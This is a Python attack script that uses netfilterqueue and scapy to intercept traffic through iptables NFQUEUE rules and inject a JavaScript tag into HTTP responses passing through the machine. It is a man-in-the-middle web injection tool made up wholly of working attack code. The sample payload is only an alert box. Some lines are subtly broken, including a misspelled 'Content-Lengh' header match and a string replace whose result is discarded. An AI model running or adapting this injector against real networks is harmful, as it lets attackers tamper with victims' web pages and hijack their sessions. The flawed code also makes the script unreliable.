#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from subprocess import call
import re

def iptable_rule(local=False):
    if local:
        call("iptables -I INPUT -j NFQUEUE --queue-num 1", shell=True)
        call("iptables -I OUTPUT -j NFQUEUE --queue-num 1", shell=True)
    else:
        call("iptables -I FORWARD -j NFQUEUE --queue-num 1", shell=True)

def del_attrs(packet, load):

    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    js = "<script>alert('giobote')</script>"

    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load

        if scapy_packet[scapy.TCP].dport == 10000:
            load.replace("HTTP/1.1", "HTTP/1.0")
            print("[+] HTTP Request")
            load = re.sub("Accept-Encoding: .*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport == 10000:
            print("[+] HTTP Response")
            load = load.replace("</body>", js + "</body>")
            content_lengh_search = re.search(r"(?:Content-Lengh:\s)(\d*)", load)

            if content_lengh_search:
                content_lengh = content_lengh_search.group(1)
                new_lengh = len(js) + int(content_lengh)
                load = load.replace(content_lengh, str(new_lengh))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = del_attrs(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(1, process_packet)
queue.run()